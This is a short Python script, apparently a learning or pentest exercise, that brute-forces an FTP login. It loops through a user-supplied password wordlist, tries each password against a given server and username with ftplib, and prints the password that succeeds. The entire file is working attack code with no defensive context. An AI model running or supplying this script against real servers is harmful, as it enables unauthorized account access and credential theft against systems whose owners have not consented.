#!/usr/bin/python3
import ftplib

server = input("FTP server: ")
user = input("Username: ")

password_list = input("Path to password list: ")

passwords = []
with open(password_list, 'r') as pw:
    for word in pw:
        passwords.append(word.strip('\r\n'))

for password in passwords:
    try:
        ftp = ftplib.FTP(server)
        ftp.login(user, password)
        print(f'Success! The password is: {password}')
        break
    except ftplib.error_perm as exc:
        print(f'Still trying... {exc}')
else:
    print('Unable to find a valid password.')


                
